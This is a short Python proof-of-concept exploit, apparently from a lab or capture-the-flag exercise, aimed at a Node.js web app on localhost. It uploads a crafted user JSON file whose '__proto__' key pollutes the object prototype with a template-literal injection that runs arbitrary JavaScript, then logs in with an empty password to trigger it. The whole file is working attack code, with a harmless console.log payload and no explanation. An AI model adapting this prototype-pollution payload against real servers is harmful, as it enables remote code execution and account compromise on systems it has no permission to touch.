import requests
import json

USERNAME = "notsuspicious"

data0 = [
    {
        "lcUsername": USERNAME,
    },
]
data1 = [
    {
        "lcUsername": USERNAME,
        "__proto__": {
            "userAutoCreateTemplate": "` || (() => {console.log('hello')})() || `"
        },
    },
]
data = json.dumps(data0)
files = {"upload-users": ("data.json", data, "application/json")}
requests.post("http://localhost:3000/upload/users", files=files)
data = json.dumps(data1)
files = {"upload-users": ("data.json", data, "application/json")}
requests.post("http://localhost:3000/upload/users", files=files)
requests.post(
    "http://localhost:3000/login", data={"username": USERNAME, "password": ""}
)
